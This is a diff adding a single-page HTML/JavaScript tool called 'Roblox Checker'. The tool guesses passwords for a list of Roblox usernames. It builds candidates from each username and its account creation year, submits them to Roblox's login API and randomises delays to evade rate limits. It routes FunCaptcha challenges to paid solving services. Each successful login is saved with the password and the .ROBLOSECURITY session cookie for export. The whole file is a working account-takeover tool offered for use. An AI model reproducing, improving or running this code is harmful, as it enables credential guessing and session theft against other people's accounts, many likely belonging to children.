@@ -1,0 +1,358 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Roblox Checker</title>
+<style>
+:root{--bg:#14161a;--pnl:#1c1f26;--ln:#2b3038;--tx:#e8eaed;--mu:#8b93a1;--ac:#4fd1c5;
+--hit:#5ddb8a;--bad:#5b6472;--wr:#f0b429;--er:#f2635f}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{margin:0;background:var(--bg);color:var(--tx);font:14px/1.5 system-ui,sans-serif;
+padding-bottom:76px}
+header{position:sticky;top:0;z-index:5;background:var(--bg);border-bottom:1px solid var(--ln);
+padding:10px 12px;display:flex;justify-content:space-between;align-items:center}
+header b{font-size:14px}header b i{color:var(--ac);font-style:normal}
+#st{font-size:11px;color:var(--mu)}
+nav{position:fixed;bottom:0;left:0;right:0;display:flex;background:var(--pnl);
+border-top:1px solid var(--ln);padding-bottom:env(safe-area-inset-bottom)}
+nav button{flex:1;padding:14px 0;background:none;border:0;color:var(--mu);font:inherit;font-weight:600}
+nav button.on{color:var(--ac);box-shadow:inset 0 2px 0 var(--ac)}
+main{padding:12px}
+section{display:none}section.on{display:block}
+label{display:block;font-size:11px;text-transform:uppercase;letter-spacing:.06em;
+color:var(--mu);margin:12px 0 4px}
+textarea,input,select{width:100%;padding:10px;border:1px solid var(--ln);border-radius:8px;
+background:var(--pnl);color:var(--tx);font:inherit}
+textarea{height:110px;font-family:ui-monospace,monospace;font-size:12px}
+input:focus,textarea:focus,select:focus{outline:1px solid var(--ac);border-color:var(--ac)}
+.row{display:flex;gap:8px}.row>*{flex:1}
+button.act{padding:12px;border:1px solid var(--ln);border-radius:8px;background:var(--pnl);
+color:var(--tx);font:inherit;font-weight:600;width:100%}
+button.pri{background:var(--ac);border-color:var(--ac);color:#0d1013}
+button:disabled{opacity:.4}
+#log{font-family:ui-monospace,monospace;font-size:11px;background:#101216;border:1px solid var(--ln);
+border-radius:8px;padding:6px;height:56vh;overflow:auto}
+.e{padding:3px 2px;border-bottom:1px solid #1a1d23;word-break:break-all}
+.HIT{color:var(--hit);font-weight:700}.BAD{color:var(--bad)}.CAPTCHA,.RATE{color:var(--wr)}
+.ERR{color:var(--er)}.INFO{color:var(--ac)}
+#hits{font-family:ui-monospace,monospace;font-size:12px}
+.h{padding:6px;border-bottom:1px solid var(--ln);color:var(--hit);word-break:break-all}
+.note{font-size:11px;color:var(--mu);margin-top:6px}
+</style>
+</head>
+<body>
+<header><b>Roblox <i>Checker</i></b><span id="st">idle</span></header>
+
+<main>
+<section id="tab-cfg" class="on">
+  <button class="act" id="diag">Test connection</button>
+  <div class="note">Run this first. If it fails, Roblox is blocking this origin and nothing else will work.</div>
+
+  <label>Accounts</label>
+  <textarea id="acc" placeholder="MarkAnthony99&#10;nextuser"></textarea>
+
+  <label>Max attempts / account</label>
+  <input id="max" type="number" min="1" max="200" value="40">
+
+  <label>Delay (ms)</label>
+  <input id="dly" type="number" min="5000" step="1000" value="60000">
+
+  <label>Captcha</label>
+  <select id="prov">
+    <option value="manual">Manual (free)</option>
+    <option value="capsolver">CapSolver</option>
+    <option value="2captcha">2Captcha</option>
+  </select>
+  <input id="key" type="password" placeholder="solver API key" style="margin-top:8px">
+
+  <div class="row" style="margin-top:14px">
+    <button class="act pri" id="go">Start</button>
+    <button class="act" id="pa">Pause</button>
+    <button class="act" id="sp">Stop</button>
+  </div>
+</section>
+
+<section id="tab-log"><div id="log"></div></section>
+
+<section id="tab-hit">
+  <div class="row"><button class="act" id="cp">Copy all</button>
+  <button class="act" id="dl">Download</button>
+  <button class="act" id="cl">Clear</button></div>
+  <div id="hits" style="margin-top:10px"></div>
+</section>
+</main>
+
+<nav>
+  <button class="on" data-t="cfg">Setup</button>
+  <button data-t="log">Log</button>
+  <button data-t="hit">Hits</button>
+</nav>
+
+<script>
+const $ = (id) => document.getElementById(id);
+const LOGIN = "https://auth.roblox.com/v2/login";
+const CSRF = "https://auth.roblox.com/v2/logout";
+const COOKIE = ".ROBLOSECURITY";
+const LEET = {a:"@",e:"3",i:"1",o:"0",s:"$"};
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+let running=false, paused=false, stop=false, hits=[];
+
+/* ---------- tabs ---------- */
+document.querySelectorAll("nav button").forEach(b => b.onclick = () => {
+  document.querySelectorAll("nav button").forEach(x => x.classList.remove("on"));
+  document.querySelectorAll("section").forEach(x => x.classList.remove("on"));
+  b.classList.add("on"); $("tab-" + b.dataset.t).classList.add("on");
+});
+
+/* ---------- log ---------- */
+function say(status, detail, user, pass) {
+  const d = document.createElement("div");
+  d.className = "e";
+  const s = document.createElement("span");
+  s.className = status; s.textContent = status;
+  d.append(s, ` ${new Date().toLocaleTimeString()} ${user ? user + ":" + pass + " " : ""}${detail || ""}`);
+  $("log").append(d);
+  while ($("log").children.length > 400) $("log").firstChild.remove();
+  $("log").scrollTop = $("log").scrollHeight;
+}
+
+/* ---------- candidates ---------- */
+const low = w => w.toLowerCase();
+const cap = w => w[0].toUpperCase() + w.slice(1).toLowerCase();
+const leet = w => [...low(w)].map(c => LEET[c] || c).join("");
+
+function tokenize(n) {
+  const c = String(n).replace(/[^A-Za-z0-9]/g, "");
+  const p = c.replace(/([a-z])([A-Z])/g,"$1 $2").replace(/([A-Za-z])(\d)/g,"$1 $2")
+    .replace(/(\d)([A-Za-z])/g,"$1 $2").split(/\s+/).filter(Boolean);
+  return { words: p.filter(x => /[A-Za-z]/.test(x)),
+           digits: (p.filter(x => /^\d+$/.test(x)).join("") || "").slice(0,4) };
+}
+
+function plan(name, year, month, max) {
+  const { words, digits } = tokenize(name);
+  if (!words.length) return [];
+  const base = String(name).replace(/[^A-Za-z0-9]/g, "");
+  const w0 = words[0], w1 = words[1] || "", w0l = low(w0), w1l = low(w1);
+  const out = [];
+  if (year) {
+    const s = String(year).slice(2), p = String(year-1), n = String(year+1);
+    for (const w of [w0, w0l]) out.push(w+year, w+s, year+w, w+p, w+n, p+w, n+w);
+    out.push(base+year, base+s, year+base);
+    if (month) { const mm = String(month).padStart(2,"0"); out.push(w0+mm+s, w0l+mm+s, w0+mm+year); }
+  }
+  out.push(base, w0, w0l, w1, w1l, w0+(digits||"99"), w1+(digits||"99"),
+    w0+w1, w0l+w1l, w0+"123", w0l+"123", base+"123", base+"1");
+  if (year) for (const w of [w0,w0l]) for (const s of ["","_","."]) for (const sp of ["","!","123"]) out.push(w+s+year+sp);
+  for (const w of [w0,w0l,base]) out.push(cap(w), w.toUpperCase(), leet(w), leet(w)+(digits||"1"));
+  if (year) out.push(base+"!", w0+"@"+year, w0+"."+year, w0+"_"+year);
+  const seen = new Set();
+  return out.filter(c => {
+    if (!c || c.length < 4 || c.length > 24 || seen.has(c)) return false;
+    seen.add(c); return true;
+  }).slice(0, max);
+}
+
+/* ---------- lookup ---------- */
+async function lookup(name) {
+  try {
+    const r = await fetch("https://users.roblox.com/v1/usernames/users", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ usernames: [name], excludeBannedUsers: false })
+    });
+    if (!r.ok) return null;
+    const id = (await r.json()).data?.[0]?.id;
+    if (!id) return null;
+    const d = await fetch(`https://users.roblox.com/v1/users/${id}`);
+    if (!d.ok) return null;
+    const info = await d.json();
+    const dt = new Date(info.created);
+    if (isNaN(dt)) return null;
+    return { created: info.created, year: dt.getUTCFullYear(), month: dt.getUTCMonth() + 1 };
+  } catch { return null; }
+}
+
+/* ---------- solver ---------- */
+function solve(prov, key, p) {
+  return new Promise((res, rej) => {
+    const fail = m => rej(new Error(m));
+    if (prov === "capsolver") {
+      fetch("https://api.capsolver.com/createTask", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ clientKey: key, task: {
+          type: "FunCaptchaTaskProxyLess", websiteURL: "https://www.roblox.com/login",
+          websitePublicKey: p.key, data: p.blob } })
+      }).then(r => r.json()).then(j => {
+        if (j.errorId) return fail(j.errorDescription);
+        const t = setInterval(() => {
+          fetch("https://api.capsolver.com/getTaskResult", {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ clientKey: key, taskId: j.taskId })
+          }).then(r => r.json()).then(s => {
+            if (s.errorId) { clearInterval(t); fail(s.errorDescription); }
+            else if (s.status === "ready") { clearInterval(t); res(s.solution.token); }
+          }).catch(() => {});
+        }, 5000);
+      }).catch(() => fail("network"));
+      return;
+    }
+    const form = new URLSearchParams({ key, method: "funCaptcha", json: "1",
+      publickey: p.key, serviceurl: p.service, siteurl: "https://www.roblox.com/login", data: p.blob });
+    fetch("https://2captcha.com/in.php", { method: "POST", body: form })
+      .then(r => r.json()).then(j => {
+        if (j.status !== 1) return fail(j.request);
+        const t = setInterval(() => {
+          fetch(`https://2captcha.com/res.php?key=${key}&action=get&id=${j.request}&json=1`)
+            .then(r => r.json()).then(s => {
+              if (s.status === 1) { clearInterval(t); res(s.request); }
+              else if (s.request !== "CAPCHA_NOT_READY") { clearInterval(t); fail(s.request); }
+            }).catch(() => {});
+        }, 5000);
+      }).catch(() => fail("network"));
+  });
+}
+
+/* ---------- engine ---------- */
+async function csrf() {
+  const r = await fetch(CSRF, { method: "POST", credentials: "include" });
+  return r.headers.get("x-csrf-token");
+}
+
+async function login(user, pass, extra) {
+  let t = await csrf();
+  if (!t) throw new Error("no csrf token");
+  for (let i = 0; i < 2; i++) {
+    const r = await fetch(LOGIN, {
+      method: "POST", credentials: "include",
+      headers: { "Content-Type": "application/json", "X-CSRF-TOKEN": t },
+      body: JSON.stringify({ ctype: "Username", cvalue: user, password: pass, ...(extra||{}) })
+    });
+    if (r.status === 403 && i === 0) { t = r.headers.get("x-csrf-token") || await csrf(); continue; }
+    return r;
+  }
+}
+
+function record(d, user, pass, hdr, joined) {
+  const cookie = hdr ? decodeURIComponent(hdr.split(";")[0].slice(COOKIE.length+1)) : "";
+  const twoFa = !!d.twoStepVerificationData;
+  hits.push({ user, pass, cookie, twoFa, joined, at: new Date().toISOString() });
+  localStorage.setItem("rbxhits", JSON.stringify(hits));
+  const el = document.createElement("div");
+  el.className = "h";
+  el.textContent = `${user}:${pass}${twoFa ? " [2FA]" : ""}`;
+  $("hits").append(el);
+  say(twoFa ? "HIT" : "HIT", twoFa ? "VALID — 2FA" : "VALID", user, pass);
+}
+
+async function attempt(user, pass, cfg, joined) {
+  const r = await login(user, pass);
+  const hdr = r.headers.getSetCookie?.().find(c => c.startsWith(COOKIE+"="));
+  if (r.status === 429) {
+    const w = Number(r.headers.get("retry-after")) || 45;
+    say("RATE", `wait ${w}s`, user, pass);
+    await sleep(w*1000); return "retry";
+  }
+  if (r.status === 200) {
+    let d = {}; try { d = await r.json(); } catch {}
+    if (d.challenge) {
+      const m = d.challenge.metadata || {};
+      if (cfg.prov === "manual" || !cfg.key) {
+        say("CAPTCHA", "solve in a login tab, then Resume", user, pass);
+        paused = true; return "captcha";
+      }
+      say("CAPTCHA", `solving via ${cfg.prov}`, user, pass);
+      try {
+        const tok = await solve(cfg.prov, cfg.key,
+          { key: m.publicKey || m.public_key, service: m.serviceUrl || m.serviceurl, blob: m.blob || m.data });
+        say("INFO", "token — resubmitting", user, pass);
+        const r2 = await login(user, pass, { captchaToken: tok,
+          captchaProvider: "PROVIDER_ARKOSE_LABS", challengeId: m.challengeId || "" });
+        if (r2.status === 200) {
+          let d2 = {}; try { d2 = await r2.json(); } catch {}
+          if (d2.challenge) { say("CAPTCHA", "repeated", user, pass); return "bad"; }
+          record(d2, user, pass, r2.headers.getSetCookie?.().find(c => c.startsWith(COOKIE+"=")), joined);
+          return "hit";
+        }
+        say("BAD", `token rejected ${r2.status}`, user, pass); return "bad";
+      } catch (e) { say("ERR", e.message, user, pass); return "bad"; }
+    }
+    record(d, user, pass, hdr, joined); return "hit";
+  }
+  let msg = `HTTP ${r.status}`;
+  try { msg = (await r.json()).errors[0].message || msg; } catch {}
+  say("BAD", msg, user, pass); return "bad";
+}
+
+async function run(cfg) {
+  const accounts = [...new Set(cfg.accounts)];
+  running = true; stop = false; paused = false;
+  $("st").textContent = `0/${accounts.length}`;
+  for (let a = 0; a < accounts.length && !stop; a++) {
+    const acc = accounts[a];
+    const info = await lookup(acc);
+    const list = plan(acc, info?.year, info?.month, cfg.max);
+    say("INFO", info ? `joined ${info.created} — ${list.length} candidates`
+                     : `unresolved — ${list.length} simple`, acc);
+    for (let i = 0; i < list.length && !stop; i++) {
+      while (paused && !stop) await sleep(400);
+      if (stop) break;
+      const r = await attempt(acc, list[i], cfg, info?.created)
+        .catch(e => { say("ERR", e.message, acc, list[i]); return "bad"; });
+      if (r === "retry") { i--; continue; }
+      if (r === "hit") break;
+      $("st").textContent = `${a+1}/${accounts.length}`;
+      if (i < list.length-1 && !stop) await sleep(cfg.delay + (Math.random()*16000 - 8000));
+    }
+    if (!stop) say("INFO", "next account", acc);
+  }
+  running = false; $("st").textContent = "done"; say("INFO", "finished");
+}
+
+/* ---------- wiring ---------- */
+$("diag").onclick = async () => {
+  say("INFO", "testing…");
+  for (const [n, u, m] of [["auth.roblox.com", CSRF, "POST"], ["users.roblox.com", "https://users.roblox.com/v1/users/1", "GET"]]) {
+    try {
+      const r = await fetch(u, { method: m, credentials: "include" });
+      say(r.headers.get("x-csrf-token") || r.ok ? "HIT" : "INFO", `${n}: reachable ${r.status}`);
+    } catch { say("ERR", `${n}: BLOCKED`); }
+  }
+};
+
+$("go").onclick = () => {
+  if (running) return;
+  const accounts = $("acc").value.split("\n").map(s => s.trim()).filter(Boolean);
+  if (!accounts.length) return say("ERR", "no accounts");
+  const cfg = { accounts, max: +$("max").value || 40,
+    delay: Math.max(5000, +$("dly").value || 60000), prov: $("prov").value, key: $("key").value.trim() };
+  localStorage.setItem("rbxcfg", JSON.stringify({ ...cfg, accounts: $("acc").value,
+    max: $("max").value, delay: $("dly").value, prov: $("prov").value, key: $("key").value }));
+  run(cfg);
+};
+$("pa").onclick = () => { paused = !paused; $("pa").textContent = paused ? "Resume" : "Pause"; };
+$("sp").onclick = () => { stop = true; paused = false; };
+$("cp").onclick = () => navigator.clipboard.writeText(hits.map(h => `${h.user}:${h.pass}:${h.cookie}`).join("\n"))
+  .then(() => say("INFO", "copied"));
+$("dl").onclick = () => {
+  const b = new Blob([JSON.stringify(hits, null, 2)], { type: "application/json" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(b); a.download = "hits.json"; a.click();
+};
+$("cl").onclick = () => { hits = []; localStorage.removeItem("rbxhits"); $("hits").replaceChildren(); };
+
+/* ---------- restore ---------- */
+(function restore() {
+  try {
+    const c = JSON.parse(localStorage.getItem("rbxcfg") || "null");
+    if (c) { $("acc").value = c.accounts || ""; $("max").value = c.max || 40;
+      $("dly").value = c.delay || 60000; $("prov").value = c.prov || "manual"; $("key").value = c.key || ""; }
+    hits = JSON.parse(localStorage.getItem("rbxhits") || "[]");
+    hits.forEach(h => { const e = document.createElement("div");
+      e.className = "h"; e.textContent = `${h.user}:${h.pass}${h.twoFa ? " [2FA]" : ""}`; $("hits").append(e); });
+  } catch {}
+})();
+</script>
+</body>
+  </html>
